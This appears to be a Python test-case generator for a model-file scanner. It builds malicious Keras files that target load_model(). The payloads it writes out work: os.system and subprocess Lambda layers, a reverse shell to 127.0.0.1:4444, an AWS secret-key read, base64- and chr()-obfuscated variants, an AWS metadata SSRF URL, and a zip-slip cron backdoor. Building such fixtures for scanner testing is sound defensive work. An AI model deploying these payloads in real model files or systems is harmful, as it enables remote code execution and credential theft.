"""Keras malicious test case generator.

Generates Keras model files containing exploit payloads that target
vulnerabilities in keras.models.load_model().
"""

import json
import os
import zipfile
from typing import List, Optional

from .base_generator import BaseTestCaseGenerator, GeneratedTestCase


class KerasTestCaseGenerator(BaseTestCaseGenerator):
    """Generates malicious Keras test case files.
    
    Creates Keras model files with exploit payloads that execute
    arbitrary code when loaded via keras.models.load_model().
    
    Vulnerability types:
    - Lambda layer RCE (CVE-2024-3660)
    - Custom layer code execution
    - Obfuscated Lambda code (base64, chr, hex)
    - Marshal/bytecode injection
    - Safe mode bypass
    - SSRF via get_file()
    - DoS via large layer sizes
    - Path traversal in archive
    - Config injection
    """
    
    VULN_TYPES = [
        "lambda_os_system",
        "lambda_subprocess",
        "lambda_reverse_shell",
        "lambda_env_exfil",
        "lambda_base64_obfuscated",
        "lambda_chr_obfuscated",
        "custom_layer_rce",
        "safe_mode_bypass",
        "ssrf_get_file",
        "dos_large_layer",
        "path_traversal",
        "config_injection",
    ]
    
    def get_format_name(self) -> str:
        return "keras"
    
    def get_format_extensions(self) -> List[str]:
        return [".keras", ".h5", ".hdf5"]
    
    def get_vulnerability_types(self) -> List[str]:
        return self.VULN_TYPES.copy()
    
    def generate_all(self, output_dir: str) -> List[GeneratedTestCase]:
        """Generate all Keras exploit test cases."""
        self._ensure_output_dir(output_dir)
        results = []
        
        for vuln_type in self.VULN_TYPES:
            try:
                tc = self.generate_specific(vuln_type, output_dir)
                if tc:
                    results.append(tc)
            except Exception as e:
                print(f"  [!] Failed to generate {vuln_type}: {e}")
        
        return results
    
    def generate_specific(self, vuln_type: str, output_dir: str) -> Optional[GeneratedTestCase]:
        """Generate a specific Keras vulnerability test case."""
        self._ensure_output_dir(output_dir)
        
        generators = {
            "lambda_os_system": self._gen_lambda_os_system,
            "lambda_subprocess": self._gen_lambda_subprocess,
            "lambda_reverse_shell": self._gen_lambda_reverse_shell,
            "lambda_env_exfil": self._gen_lambda_env_exfil,
            "lambda_base64_obfuscated": self._gen_lambda_base64,
            "lambda_chr_obfuscated": self._gen_lambda_chr,
            "custom_layer_rce": self._gen_custom_layer,
            "safe_mode_bypass": self._gen_safe_mode_bypass,
            "ssrf_get_file": self._gen_ssrf_get_file,
            "dos_large_layer": self._gen_dos_large_layer,
            "path_traversal": self._gen_path_traversal,
            "config_injection": self._gen_config_injection,
        }
        
        if vuln_type not in generators:
            return None
        
        return generators[vuln_type](output_dir)
    
    def _create_keras_v3_model(self, filepath: str, config: dict, weights_data: bytes = b""):
        """Create a Keras v3 model file (.keras is a ZIP archive)."""
        with zipfile.ZipFile(filepath, "w", zipfile.ZIP_DEFLATED) as zf:
            # Write config.json
            zf.writestr("config.json", json.dumps(config, indent=2))
            
            # Write empty weights
            if weights_data:
                zf.writestr("model.weights.h5", weights_data)
    
    def _create_lambda_config(self, lambda_code: str, layer_name: str = "malicious_lambda") -> dict:
        """Create a model config with a Lambda layer."""
        return {
            "class_name": "Sequential",
            "config": {
                "name": "malicious_model",
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "config": {
                            "batch_input_shape": [None, 10],
                            "dtype": "float32",
                            "name": "input"
                        }
                    },
                    {
                        "class_name": "Lambda",
                        "config": {
                            "name": layer_name,
                            "function": lambda_code,
                            "output_shape": [10]
                        }
                    }
                ]
            },
            "keras_version": "3.0.0",
            "backend": "tensorflow"
        }
    
    def _gen_lambda_os_system(self, output_dir: str) -> GeneratedTestCase:
        """Generate Lambda layer with os.system() RCE."""
        filename = "exploit_lambda_os_system_CVE-2024-3660.keras"
        filepath = os.path.join(output_dir, filename)
        
        lambda_code = "lambda x: ((__import__('os').system('id')), x)[1]"
        config = self._create_lambda_config(lambda_code, "os_system_lambda")
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Lambda Layer os.system() RCE",
            target_parser="keras.models.load_model()",
            cve_id="CVE-2024-3660",
            description="Lambda layer executes os.system() when model is loaded",
            severity="critical",
        )
    
    def _gen_lambda_subprocess(self, output_dir: str) -> GeneratedTestCase:
        """Generate Lambda layer with subprocess RCE."""
        filename = "exploit_lambda_subprocess.keras"
        filepath = os.path.join(output_dir, filename)
        
        lambda_code = "lambda x: ((__import__('subprocess').call(['id'])), x)[1]"
        config = self._create_lambda_config(lambda_code, "subprocess_lambda")
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Lambda Layer subprocess RCE",
            target_parser="keras.models.load_model()",
            cve_id="CVE-2024-3660",
            description="Lambda layer spawns subprocess when model is loaded",
            severity="critical",
        )
    
    def _gen_lambda_reverse_shell(self, output_dir: str) -> GeneratedTestCase:
        """Generate Lambda layer with reverse shell."""
        filename = "exploit_lambda_reverse_shell.keras"
        filepath = os.path.join(output_dir, filename)
        
        # Reverse shell in Lambda
        lambda_code = (
            "lambda x: (exec(\"import socket,subprocess,os;s=socket.socket();"
            "s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call(['/bin/sh','-i'])\"), x)[1]"
        )
        config = self._create_lambda_config(lambda_code, "reverse_shell_lambda")
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Lambda Layer Reverse Shell",
            target_parser="keras.models.load_model()",
            cve_id="CVE-2024-3660",
            description="Lambda layer spawns reverse shell when model is loaded",
            severity="critical",
        )
    
    def _gen_lambda_env_exfil(self, output_dir: str) -> GeneratedTestCase:
        """Generate Lambda layer that exfiltrates environment variables."""
        filename = "exploit_lambda_env_exfiltration.keras"
        filepath = os.path.join(output_dir, filename)
        
        lambda_code = (
            "lambda x: (print('AWS_SECRET_ACCESS_KEY=' + "
            "__import__('os').environ.get('AWS_SECRET_ACCESS_KEY', 'not_found')), x)[1]"
        )
        config = self._create_lambda_config(lambda_code, "env_exfil_lambda")
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Lambda Layer Environment Exfiltration",
            target_parser="keras.models.load_model()",
            cve_id="CVE-2024-3660",
            description="Lambda layer reads and exfiltrates environment variables (secrets)",
            severity="high",
        )
    
    def _gen_lambda_base64(self, output_dir: str) -> GeneratedTestCase:
        """Generate Lambda layer with base64 obfuscated payload."""
        filename = "exploit_lambda_base64_obfuscated.keras"
        filepath = os.path.join(output_dir, filename)
        
        # base64 encoded: os.system('id')
        lambda_code = (
            "lambda x: (exec(__import__('base64').b64decode("
            "b'X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk=').decode()), x)[1]"
        )
        config = self._create_lambda_config(lambda_code, "base64_obfuscated_lambda")
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Lambda Layer Base64 Obfuscated",
            target_parser="keras.models.load_model()",
            cve_id="CVE-2024-3660",
            description="Obfuscated Lambda payload using base64 encoding to evade detection",
            severity="critical",
        )
    
    def _gen_lambda_chr(self, output_dir: str) -> GeneratedTestCase:
        """Generate Lambda layer with chr() obfuscated payload."""
        filename = "exploit_lambda_chr_obfuscated.keras"
        filepath = os.path.join(output_dir, filename)
        
        # chr() obfuscated: os.system('id')
        lambda_code = (
            "lambda x: (exec(''.join([chr(111),chr(115),chr(46),chr(115),chr(121),"
            "chr(115),chr(116),chr(101),chr(109),chr(40),chr(39),chr(105),chr(100),"
            "chr(39),chr(41)])), x)[1]"
        )
        config = self._create_lambda_config(lambda_code, "chr_obfuscated_lambda")
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Lambda Layer chr() Obfuscated",
            target_parser="keras.models.load_model()",
            cve_id="CVE-2024-3660",
            description="Obfuscated Lambda payload using chr() concatenation to evade detection",
            severity="critical",
        )
    
    def _gen_custom_layer(self, output_dir: str) -> GeneratedTestCase:
        """Generate custom layer RCE."""
        filename = "exploit_custom_layer_rce.keras"
        filepath = os.path.join(output_dir, filename)
        
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "malicious_model",
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "config": {"batch_input_shape": [None, 10], "dtype": "float32"}
                    },
                    {
                        "class_name": "MaliciousLayer",
                        "module": "os",  # Dangerous module!
                        "config": {
                            "name": "malicious_custom",
                            "units": 10
                        }
                    }
                ]
            }
        }
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Custom Layer Module Injection",
            target_parser="keras.models.load_model()",
            cve_id=None,
            description="Custom layer config injects dangerous 'os' module",
            severity="critical",
        )
    
    def _gen_safe_mode_bypass(self, output_dir: str) -> GeneratedTestCase:
        """Generate safe mode bypass attempt."""
        filename = "exploit_safe_mode_bypass.keras"
        filepath = os.path.join(output_dir, filename)
        
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "bypass_model",
                "safe_mode": False,  # Attempt to disable safe mode
                "enable_unsafe_deserialization": True,
                "layers": [
                    {
                        "class_name": "Lambda",
                        "config": {
                            "function": "lambda x: (__import__('os').system('id'), x)[1]"
                        }
                    }
                ]
            }
        }
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Safe Mode Bypass Attempt",
            target_parser="keras.models.load_model()",
            cve_id=None,
            description="Config attempts to disable safe_mode to enable code execution",
            severity="critical",
        )
    
    def _gen_ssrf_get_file(self, output_dir: str) -> GeneratedTestCase:
        """Generate SSRF via get_file()."""
        filename = "exploit_ssrf_get_file.keras"
        filepath = os.path.join(output_dir, filename)
        
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "ssrf_model",
                "weights_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "layers": [
                    {"class_name": "Dense", "config": {"units": 10}}
                ]
            }
        }
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="SSRF via get_file()",
            target_parser="keras.utils.get_file()",
            cve_id=None,
            description="Config contains AWS metadata SSRF URL in weights_url",
            severity="critical",
        )
    
    def _gen_dos_large_layer(self, output_dir: str) -> GeneratedTestCase:
        """Generate DoS via extremely large layer."""
        filename = "exploit_dos_large_layer.keras"
        filepath = os.path.join(output_dir, filename)
        
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "dos_model",
                "layers": [
                    {"class_name": "InputLayer", "config": {"batch_input_shape": [None, 10]}},
                    {"class_name": "Dense", "config": {"units": 99999999999999}}  # Huge!
                ]
            }
        }
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="DoS via Large Layer Size",
            target_parser="keras.models.load_model()",
            cve_id=None,
            description="Layer with 99 trillion units causes memory exhaustion",
            severity="high",
        )
    
    def _gen_path_traversal(self, output_dir: str) -> GeneratedTestCase:
        """Generate path traversal in archive."""
        filename = "exploit_path_traversal.keras"
        filepath = os.path.join(output_dir, filename)
        
        with zipfile.ZipFile(filepath, "w", zipfile.ZIP_DEFLATED) as zf:
            # Normal config
            zf.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {}}))
            # Path traversal entry
            zf.writestr("../../../../tmp/pwned.txt", "You have been pwned!")
            zf.writestr("../../../etc/cron.d/backdoor", "* * * * * root /bin/bash -c 'id'")
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="ZIP Path Traversal (Zip Slip)",
            target_parser="Archive extraction",
            cve_id=None,
            description="Archive contains path traversal entries to overwrite system files",
            severity="critical",
        )
    
    def _gen_config_injection(self, output_dir: str) -> GeneratedTestCase:
        """Generate config injection attack."""
        filename = "exploit_config_injection.keras"
        filepath = os.path.join(output_dir, filename)
        
        config = {
            "class_name": "Sequential",
            "config": {
                "name": "injection_model",
                "layers": [
                    {
                        "class_name": "Dense",
                        "module": "subprocess",  # Injected dangerous module
                        "config": {
                            "units": 10,
                            "function": "__import__('os').system"  # Injected function
                        }
                    }
                ]
            }
        }
        self._create_keras_v3_model(filepath, config)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Config Injection",
            target_parser="keras.models.load_model()",
            cve_id=None,
            description="Config injects dangerous module and function references",
            severity="critical",
        )
